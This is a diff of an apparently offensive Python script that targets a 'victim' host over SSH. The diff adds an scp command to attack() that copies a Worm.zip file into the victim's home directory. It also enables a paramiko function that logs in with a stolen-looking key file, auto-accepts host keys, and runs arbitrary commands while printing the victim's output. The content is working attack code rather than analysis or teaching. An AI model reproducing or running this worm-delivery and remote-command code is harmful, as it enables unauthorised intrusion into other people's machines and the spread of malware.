@@ -27,6 +27,9 @@ def init():
 
 def attack():
     print('\nStart attacking...')
+
+    # Pass worm to the victim
+    os.system('scp -P {0} Worm.zip {1}@{2}:/home/{1}'.format(victim['port'], victim['name'], victim['ip']))
     pass
 
 
@@ -38,7 +41,7 @@ def ssh_command_using_name_pw(command):
     session = client.get_transport().open_session()
 
     if session.active:
-        print(command)
+        print('[Command]', command)
         session.exec_command(command)
 
         print('\n--------Victim Std Out--------')
@@ -49,24 +52,24 @@ def ssh_command_using_name_pw(command):
         print('Session Failed')
 
 
-# def ssh_command_using_ssh_key(command):
-#     client = paramiko.SSHClient()
-#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-#     client.connect(victim['ip'], port=victim['port'], passphrase='12345')
-#
-#     session = client.get_transport().open_session()
-#
-#     if session.active:
-#         print(command)
-#         session.exec_command(command)
-#
-#         print('\n--------Victim Std Out--------')
-#         print(session.recv(2048))
-#         print('--------Victim Std Out--------\n')
-#
-#     else:
-#         print('Session Failed')
-#     pass
+def ssh_command_using_ssh_key(command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+    client.connect(victim['ip'], port=victim['port'], key_filename='~/.ssh/victim_key')
+
+    session = client.get_transport().open_session()
+
+    if session.active:
+        print('[Command]', command)
+        session.exec_command(command)
+
+        print('\n--------Victim Std Out--------')
+        print(session.recv(2048))
+        print('--------Victim Std Out--------\n')
+
+    else:
+        print('Session Failed')
+    pass
 
 
 def set_up_user():
